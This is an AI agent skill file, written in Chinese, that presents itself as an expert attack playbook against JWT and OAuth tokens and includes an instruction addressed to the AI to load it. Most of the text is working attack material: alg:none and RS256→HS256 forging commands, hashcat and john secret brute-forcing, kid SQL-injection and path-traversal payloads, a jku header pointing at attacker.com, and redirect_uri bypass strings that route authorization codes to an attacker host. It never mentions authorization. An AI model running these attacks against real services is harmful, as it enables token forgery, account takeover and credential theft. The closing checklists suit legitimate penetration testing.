---
name: jwt-oauth-token-attacks
description: >-
  JWT 与 OAuth 令牌攻击手册。适用于验证令牌信任、签名算法、密钥处理、声明滥用、Bearer 流程以及 OAuth 账号绑定类弱点时。
---

# 技能：JWT 与 OAuth 2.0 令牌攻击 — 专家级攻击手册

> **AI 加载指令**：专家级认证令牌攻击。覆盖 JWT 密码学攻击（alg:none、RS256→HS256、密钥爆破、kid/jku 注入）、OAuth 流程攻击（CSRF、开放重定向、令牌窃取、隐式流程滥用）、PKCE 绕过，以及经由 Referer/日志的令牌泄露。这对现代 Web 应用至关重要。

## 0. 相关路由

本文件用于以令牌为中心的攻击与流程滥用。同时加载：

- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)（OAuth/OIDC 错误配置）：涉及重定向 URI、state、nonce、PKCE 与账号绑定校验
- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md)（CORS 跨源错误配置）：当可能存在浏览器可读 API 或跨源令牌泄露时
- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md)（SAML SSO 断言攻击）：当目标在 OAuth/OIDC 之外使用企业 SSO 时

如果文件不存在的话通过搜索引擎去搜索下

---

## 1. JWT 结构剖析

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**在终端中解码**：
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
# → {"userId":1234,"role":"user"}
```

**常见声明篡改目标**（修改以提升权限）：
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. 攻击 1 — 算法置空（alg:none）

当算法为 "none"/"None"/"NONE" 时，服务器不校验签名：

```bash
# Burp JWT Editor / python-jwt attack:
# Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

# Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
# OR:
HEADER.PAYLOAD
```

**工具（jwt_tool）**：
```bash
python3 jwt_tool.py JWT_TOKEN -X a
# → automatically generates alg:none variants
```

---

## 3. 攻击 2 — RS256 转 HS256 密钥混淆

**当服务器使用 RS256 时**（非对称 — RSA 私钥签名、公钥验签）：
- 服务器公钥通常可被发现（JWKS 端点、`/certs`、源码）
- 攻击：告诉服务器"这是 HS256" → 服务器就会**把公钥当作密钥**校验 HS256 HMAC

```bash
# Step 1: Obtain public key (PEM format)
# From: /api/.well-known/jwks.json → convert to PEM
# From: /certs endpoint
# From: OpenSSL extraction from HTTPS cert

# Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# Step 3: Manually:
# Modify header: {"alg":"HS256","typ":"JWT"}
# Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. 攻击 3 — JWT 密钥爆破

基于 HMAC 的 JWT（HS256/HS384/HS512）且密钥较弱时：

```bash
# hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

# john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**可手工测试的常见弱密钥**：
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. 攻击 4 — kid（Key ID）注入

`kid` 头部参数指定验签所用的密钥。没有过滤就等于注入：

### kid SQL 注入
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
若后端执行 SQL：`SELECT key FROM keys WHERE kid = 'INPUT'`  
结果：HMAC 密钥 = `'attacker_controlled_key'` → 即可用该值伪造任意 payload 的签名。

### kid 路径遍历（文件读取）
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
服务器把 `/dev/null` 当作密钥读取 → 得到空字符串 → 用空 HMAC 为令牌签名。

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
服务器把 hostname 当作密钥读取 → 即可用 hostname 字符串为伪造令牌签名。

---

## 6. 攻击 5 — jku / x5u 头部注入

`jku` 指向 JSON Web Key Set 的 URL。若未做白名单校验：
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

**准备工作**：
```bash
# Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Create JWKS:
python3 -c "
import json, base64, struct
# ... (use python-jwcrypto or jwt_tool to export JWKS)
"

# Host malicious JWKS at attacker.com/malicious-jwks.json
# Sign JWT with attacker's private key
# Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool 自动化**：
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAuth 2.0 — 缺少 state 参数（CSRF）

state 参数用于在 OAuth 中防御 CSRF。若缺失：

```
Attack:
1. Click "Login with Google" → OAuth starts → intercept the redirect URL:
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. Get the authorization code (stop before exchanging it)
3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE
4. Victim clicks that URL → their session binds to ATTACKER's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAuth — redirect_uri 绕过

授权码会被发送到 `redirect_uri`。若校验不严：

### redirect_uri 中的开放重定向
```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

### 部分路径匹配
```
Whitelist: https://target.com/callback
Attack: https://target.com/callback%2f../admin (URL path confusion)
        https://target.com/callbackXSS (prefix match only)
```

### 本地 / 开发环境重定向
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
```

---

## 9. OAuth — 隐式流程令牌窃取

隐式流程：令牌通过 URL fragment `#access_token=...` 返回

**Fragment 泄露场景**：
- 重定向到攻击者页面：可通过 `document.referrer` 或目标页面中的 `<script>window.location.href</script>` 读取 fragment
- 开放重定向：`redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → fragment 中的令牌最终落到攻击者页面

---

## 10. OAuth — 作用域提升

请求比授权码中已授权范围更宽的 scope：
```
Authorized scope: read:profile
Attack: During token exchange, add scope=admin or scope=read:admin
→ Does server grant requested scope or issued scope?
```

---

## 11. 令牌泄露途径

### Referer 头部
令牌出现在 URL 中 → 页面加载外部资源 → Referer 泄露令牌：
```
https://target.com/dashboard#access_token=TOKEN
→ HTML loads: <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com sees token in Referer logs
```

### 服务器日志
通过查询参数发送的访问令牌会被记录在：
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

---

## 12. JWT 测试清单

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ Test token reuse after logout
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---

## 13. OAuth 测试清单

```
□ Check for state parameter in authorization request
□ Test redirect_uri manipulation (open redirect, prefix match, path confusion)
□ Can tokens be exchanged more than once?
□ Test scope escalation during token exchange
□ Implicit flow: check for token in Referer/history
□ PKCE: can code_challenge be bypassed or code_verifier be empty?
□ Check for authorization code reuse (code must be single-use)
□ Test account linking abuse: link OAuth to existing account with same email
□ Check OAuth provider confusion: use Apple ID to link where Google expected
```
